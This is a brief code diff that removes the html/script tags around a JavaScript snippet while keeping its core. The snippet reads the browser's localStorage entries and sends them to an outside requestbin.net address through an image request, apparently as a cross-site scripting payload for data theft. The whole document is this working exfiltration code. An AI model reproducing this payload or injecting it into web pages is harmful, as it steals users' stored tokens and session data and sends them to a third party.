@@ -1,4 +1,3 @@
-<html><script>
 if (window.localStorage) {
     if (localStorage.length) {
             var output;
@@ -9,5 +8,3 @@ if (window.localStorage) {
             new Image().src = 'http://requestbin.net/r/rivehrri?'+output;
 	}
 }
-</script></html>
-
